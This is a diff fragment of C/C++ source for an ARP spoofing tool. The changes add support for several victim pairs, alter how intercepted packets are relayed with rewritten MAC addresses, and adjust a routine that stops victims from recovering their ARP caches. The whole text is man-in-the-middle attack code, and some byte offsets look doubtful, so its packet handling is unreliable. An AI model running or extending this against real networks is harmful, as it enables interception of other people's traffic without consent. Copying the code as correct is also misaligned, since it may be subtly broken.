@@ -1,41 +1,10 @@
-#include <stdio.h>
-#include <pcap.h>
-#include <stdint.h>
-#include <arpa/inet.h>
-#include <string.h>
-#include <stdlib.h>
-#include <sys/socket.h>
-#include <sys/types.h>
-#include <net/if.h>
-#include <sys/ioctl.h>
-#include <unistd.h>
-#include <sys/stat.h>
-#include <algorithm>
-using namespace std;
+#include "arp_spoof.h"
 
-#define REQUEST 1
-#define REPLY 2
-
-typedef struct arp_packet{
-  uint8_t dest_mac[6];	//6
-  uint8_t src_mac[6];	//12
-  uint16_t type;	//14
-
-  uint16_t hw_type;	//16
-  uint16_t protocol_type;//18
-  uint8_t hw_size;	//19
-  uint8_t protocol_size;//20
-  uint16_t opcode;	//22
-  uint8_t src_mac2[6];	//28
-  uint8_t src_ip[4];	//32
-  uint8_t dest_mac2[6];	//38
-  uint8_t dest_ip[4];	//42
-} packet;
-
+u_char relay[10000];
 
 void usage() {
-  printf("syntax: arp_spoof <interface> <sender ip> <target ip>\n");
-  printf("example: arp_spoof wlan0 192.168.10.2 192.168.10.1\n");
+  printf("syntax: arp_spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2> ...]\n");
+  printf("example: arp_spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.3 192.168.10.1\n");
   return;
 }
 
@@ -163,14 +132,15 @@ void relay_ip_packet(pcap_t* handle, uint8_t* my_ip, uint8_t* my_mac, uint8_t* s
   int res = pcap_next_ex(handle, &header, &packet);
   if (res == -1 || res == -2) return;
   
-  u_char* relay;
   if(packet[18] == 0x08 && packet[19] == 0x00) {
     if(memcmp(packet+30, my_ip, 4)) {
       if(!memcmp(packet+6, src_mac, 6)){
         memcpy(relay, packet, header->caplen);
         for(int i = 0; i < 6; i++) {
-          relay[i] = my_mac[i];
-          relay[i + 6] = dest_mac[i];
+          relay[i + 6] = my_mac[i];
+          relay[i + 22] = my_mac[i];
+          relay[i] = dest_mac[i];
+          relay[i + 32] = dest_mac[i];
         }
       }
       pcap_sendpacket(handle, relay, header->caplen);
@@ -193,7 +163,7 @@ void prevent_arp_recovery(pcap_t* handle, uint8_t* my_ip, uint8_t* src_mac) {
         swap_ranges(ret, ret+6, ret+6);
         swap_ranges(ret+22, ret+28, ret+32);
         swap_ranges(ret+28, ret+32, ret+38);
-        ret[29] = htons(REPLY);
+        ret[20] = htons(REPLY);
         pcap_sendpacket(handle, ret, header->caplen);
       }
     }
